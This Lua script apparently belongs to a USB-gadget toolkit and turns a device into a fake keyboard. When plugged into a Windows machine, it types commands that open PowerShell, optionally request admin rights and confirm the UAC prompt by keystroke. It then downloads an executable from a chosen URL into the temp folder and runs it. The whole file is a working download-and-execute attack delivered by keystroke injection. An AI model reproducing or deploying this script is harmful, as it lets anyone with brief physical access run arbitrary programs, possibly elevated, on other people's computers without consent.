---
--- downloadrun.lua: downloads and executes a file
--- directly translated from the Java version in previous builds
---

usb = luausb.create({ id = 0, type = "keyboard" })
kb = usb.dev[1]

local file = usb.ask("File to download?", "https://github.com/Netdex/FlyingCursors/releases/download/1.0.0/FlyingCursors.exe")
local runAs = usb.should("Task UAC", "Launch exe as admin?");

while true do
    usb.log("idle")

    -- poll until usb plugged in
    while usb.state() == "not attached" do
        usb.delay(1000)
    end

    usb.log("running")
    usb.delay(1000)

    usb.log("opening powershell, runAs=" .. tostring(runAs))
    if runAs then
        -- when running elevated prompt sometimes it pops in background, so we need
        -- to go to the desktop
        kb.press_keys(kb.LSUPER, kb.D)
        usb.delay(500)
        kb.press_keys(kb.LSUPER, kb.R)
        usb.delay(2000)
        kb.send_string("powershell Start-Process powershell -Verb runAs\n")
        usb.delay(3000)
        kb.press_keys(kb.LALT, kb.Y)
        usb.delay(2000)
    else
        kb.press_keys(kb.LSUPER, kb.R)
        usb.delay(2000)
        kb.send_string("powershell\n")
        usb.delay(2000)
    end

    usb.log("download + execute code")

    kb.send_string(
            "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;$d=New-Object System.Net.WebClient;" ..
                    "$u='" .. file .. "';" ..
                    "$f=\"$Env:Temp\\a.exe\";$d.DownloadFile($u,$f);" ..
                    "$e=New-Object -com shell.application;" ..
                    "$e.shellexecute($f);" ..
                    "exit;\n"
    )

    usb.log("done")
    -- poll until usb unplugged
    while usb.state() == "configured" do
        usb.delay(1000)
    end
    usb.log("disconnected")
end

